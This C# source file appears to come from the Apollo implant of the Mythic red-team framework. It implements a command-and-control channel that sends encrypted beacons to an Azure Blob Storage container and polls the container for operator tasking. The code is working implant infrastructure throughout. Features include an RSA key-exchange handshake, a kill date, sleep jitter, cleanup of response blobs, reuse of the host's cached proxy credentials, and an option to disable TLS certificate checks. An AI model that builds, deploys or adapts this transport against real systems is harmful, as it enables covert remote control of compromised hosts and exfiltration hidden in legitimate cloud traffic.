using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Net;
using ApolloInterop.Enums.ApolloEnums;

namespace AzureBlobTransport
{
    public class AzureBlobProfile : C2Profile, IC2Profile
    {
        // How many bytes to read per iteration of downloading a blob
        const int HTTP_READ_BLOCK_LENGTH = 11000;

        // TODO: This ideally needs to come from the C2 Profile so we can sync with the server timeout
        const int RETRY_DELAY = 5000;
        const int MAX_RETRY_ATTEMPTS = 5;

        private int CallbackInterval;
        private double CallbackJitter;
        private string BlobEndpoint;
        private string ContainerName;
        private string SasToken;
        private bool EncryptedExchangeCheck;
        private string KillDate;
        private bool _uuidNegotiated = false;
        private string ProxyHost;
        private int ProxyPort;
        private string ProxyUser;
        private string ProxyPass;
        private string ProxyAddress;
        private RSAKeyGenerator rsa = null;

        // Microsoft Azure should always pass TLS cert check (unless something is in the middle)
        private bool EnableTLSCertCheck = true;

        // Maximum time to wait for a single response blob before giving up
        private const int RESPONSE_TIMEOUT_MS = 300000; // 5 minutes

        private string ParseURLAndPort(string host, int port)
        {
            string final_url = "";
            int last_slash = -1;
            if (port == 443 && host.StartsWith("https://"))
            {
                final_url = host;
            }
            else if (port == 80 && host.StartsWith("http://"))
            {
                final_url = host;
            }
            else
            {
                last_slash = host.Substring(port == 443? 8 : 7).IndexOf("/");
                if (last_slash == -1)
                {
                    final_url = string.Format("{0}:{1}", host, port);
                }
                else
                {
                    last_slash += 8;
                    final_url = host.Substring(0, last_slash) + $":{port}" + host.Substring(last_slash);
                }
            }
            return final_url;
        }

        public AzureBlobProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent)
            : base(data, serializer, agent)
        {
            CallbackInterval = int.Parse(data["callback_interval"]);
            CallbackJitter = double.Parse(data["callback_jitter"]);
            BlobEndpoint = data["blob_endpoint"];
            ContainerName = data["container_name"];
            SasToken = data["sas_token"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            KillDate = data["killdate"];
            if (data.ContainsKey("enable_certificate_check") && data["enable_certificate_check"] == "")
            {
                EnableTLSCertCheck = false;
            }
            else
            {
                if (data.ContainsKey("enable_certificate_check") && 
                    (data["enable_certificate_check"][0] == 'T' || data["enable_certificate_check"][0] == 't'))
                {
                    EnableTLSCertCheck = true;
                }
                else
                {
                    EnableTLSCertCheck = false;
                }
            }
            ProxyHost = data["proxy_host"];
            if (data["proxy_port"].Length > 0)
            {
                ProxyPort = int.Parse(data["proxy_port"]);
                if (ProxyHost.Length > 0)
                {
                    ProxyAddress = this.ParseURLAndPort(ProxyHost, ProxyPort);
                }
            }
            ProxyUser = data["proxy_user"];
            ProxyPass = data["proxy_pass"];

            rsa = agent.GetApi().NewRSAKeyPair(4096);

            // Disable certificate validation on web requests
            if (EnableTLSCertCheck == false)
            {
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            }

            Agent.SetSleep(CallbackInterval, CallbackJitter);
        }

        /// <summary>
        /// Construct the full blob URL with SAS token for a given blob path.
        /// </summary>
        private string GetBlobUrl(string blobPath)
        {
            return string.Format("{0}/{1}/{2}?{3}", BlobEndpoint, ContainerName, blobPath, SasToken);
        }

        /// <summary>
        /// Creates a new instance of a HttpWebRequest with appropriate proxy settings
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        private HttpWebRequest CreateConfiguredWebRequest(string url)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

            if (!string.IsNullOrEmpty(ProxyHost) &&
            !string.IsNullOrEmpty(ProxyUser) &&
            !string.IsNullOrEmpty(ProxyPass))
            {
                request.Proxy = (IWebProxy)new WebProxy()
                {
                    Address = new Uri(ProxyAddress),
                    Credentials = new NetworkCredential(ProxyUser, ProxyPass),
                    UseDefaultCredentials = false,
                    BypassProxyOnLocal = false
                };
            }
            else
            {
                // Use Default Proxy and Cached Credentials for Internet Access
                request.Proxy = WebRequest.GetSystemWebProxy();
                request.Proxy.Credentials = CredentialCache.DefaultCredentials;
            }

            request.Timeout = RESPONSE_TIMEOUT_MS;

            return request;
        }

        /// <summary>
        /// Upload data to a blob using HTTP PUT (Azure Blob REST API).
        /// </summary>
        private bool PutBlob(string blobPath, byte[] data)
        {
            string url = GetBlobUrl(blobPath);
            try
            {
                HttpWebRequest request = CreateConfiguredWebRequest(url);
                request.Method = "PUT";
                request.ContentType = "application/octet-stream";
                request.ContentLength = data.Length;
                request.Headers.Add("x-ms-blob-type", "BlockBlob");

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    return response.StatusCode == HttpStatusCode.Created ||
                           response.StatusCode == HttpStatusCode.OK;
                }
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("Error occured uploading blob: {0}", ex.Message));
            }
        }

        /// <summary>
        /// Download blob data using HTTP GET. Throws exception if the blob does not exist (404).
        /// </summary>
        private byte[] GetBlob(string blobPath)
        {
            string url = GetBlobUrl(blobPath);
            try
            {
                HttpWebRequest request = CreateConfiguredWebRequest(url);
                request.Method = "GET";

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    using (var stream = response.GetResponseStream())
                    {
                        // Read all bytes from the response stream
                        using (var memStream = new System.IO.MemoryStream())
                        {
                            byte[] buffer = new byte[HTTP_READ_BLOCK_LENGTH];
                            int bytesRead;
                            while ((bytesRead = stream.Read(buffer, 0, HTTP_READ_BLOCK_LENGTH)) > 0)
                            {
                                memStream.Write(buffer, 0, bytesRead);
                            }
                            return memStream.ToArray();
                        }
                    }
                }
            }
            
            catch (WebException ex)
            {
                if (ex.Response is HttpWebResponse httpResp && httpResp.StatusCode == HttpStatusCode.NotFound)
                {
                    throw new Exception("Blob was not found"); // Blob does not exist yet
                }

                throw new Exception(String.Format("Exception occured downloading blob: {0}", ex.Message));
            }
            catch (Exception)
            {
                throw;
            }
        }

        /// <summary>
        /// Delete a blob using HTTP DELETE.
        /// </summary>
        private bool DeleteBlob(string blobPath)
        {
            string url = GetBlobUrl(blobPath);
            try
            {
                HttpWebRequest request = CreateConfiguredWebRequest(url);

                request.Method = "DELETE";

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    return response.StatusCode == HttpStatusCode.Accepted ||
                           response.StatusCode == HttpStatusCode.OK;
                }
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("Exception occured deleting blob: {0}", ex.Message));
            }
        }

        /// <summary>
        /// Core send-and-receive operation via Azure Blob Storage.
        /// </summary>
        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            if (message == null) { throw new ArgumentNullException("message"); }

            // Generate a unique message ID for request/response correlation
            string messageId = Guid.NewGuid().ToString();

            // Serialize the message (EncryptedJsonSerializer produces base64(uuid + AES(json)))
            string serialized = Serializer.Serialize(message);
            byte[] payload = Encoding.UTF8.GetBytes(serialized);

            try
            {
                // PUT to ats/{messageId}.blob
                if (!PutBlob(string.Format("ats/{0}.blob", messageId), payload))
                {
                    return false;
                }
            }
            catch (Exception)
            {
                return false;
            }

            // Poll for the response at sta/{messageId}.blob
            string staBlobPath = string.Format("sta/{0}.blob", messageId);
            byte[] responseData = null;

            // Repeat (there is a delay between uploading and then the download being available
            for (int i = 0; i < MAX_RETRY_ATTEMPTS; i++)
            {
                // Not ideal, but the Azure Blob profile doesn't currently expose the poll rate
                Thread.Sleep(RETRY_DELAY);

                try
                {
                    responseData = GetBlob(staBlobPath);
                }
                catch (Exception)
                {
                    continue;
                }

                break;

            }

            if (responseData == null || responseData.Length == 0)
            {
                return false;
            }

            // Deserialize the response
            // The C2 server returns the raw Mythic response (base64(uuid + AES(json)))
            string responseString = Encoding.UTF8.GetString(responseData);
            try
            {
                TResult result = Serializer.Deserialize<TResult>(responseString);
                onResponse(result);
                
            }
            catch (Exception)
            {
                return false;
            }

            // Clean up the response blob
            // This is best effort, if it fails, we still return success because we have
            // a valid deserialized response already
            try
            {
                DeleteBlob(staBlobPath);
            }
            catch (Exception)
            {
                // Do nothing, it's best effort
            }

            return true;
        }

        public void Start()
        {
            while (Agent.IsAlive())
            {
                GetTasking(resp => Agent.GetTaskManager().ProcessMessageResponse(resp));
                Agent.Sleep();
            }
        }

        private bool GetTasking(OnResponse<MessageResponse> onResp)
        {
            return Agent.GetTaskManager().CreateTaskingMessage(msg => SendRecv(msg, onResp));
        }

        public bool IsOneWay() => false;

        public bool Send<T>(T message) => throw new NotImplementedException("AzureBlobProfile does not support Send only.");
        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp) => throw new NotImplementedException("AzureBlobProfile does not support Recv only.");

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = this.rsa.ExportPublicKey(),
                    SessionID = this.rsa.SessionId
                };

                if (!SendRecv<EKEHandshakeMessage, EKEHandshakeResponse>(handshake1, delegate (EKEHandshakeResponse respHandshake)
                {
                    byte[] tmpKey = this.rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    Agent.SetUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }

            return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
            {
                Connected = true;
                if (!_uuidNegotiated)
                {
                    ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                    Agent.SetUUID(mResp.ID);
                    _uuidNegotiated = true;
                }
                return onResp(mResp);
            });
        }
    }
}

